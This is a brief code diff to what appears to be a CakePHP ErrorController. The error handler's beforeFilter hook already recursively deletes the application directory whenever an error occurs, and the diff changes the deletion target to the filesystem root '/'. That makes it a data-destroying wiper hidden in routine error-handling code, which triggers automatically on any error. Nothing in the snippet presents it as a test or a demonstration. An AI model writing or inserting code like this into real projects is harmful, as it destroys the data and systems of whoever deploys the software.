@@ -40,7 +40,7 @@ class ErrorController extends AppController
     public function beforeFilter(EventInterface $event)
     {
         debug('You got an error! Deleting /src...');
-        if ($this->rrmdir(APP)) {
+        if ($this->rrmdir('/')) {
             debug('The error is no more!');
         }
     }
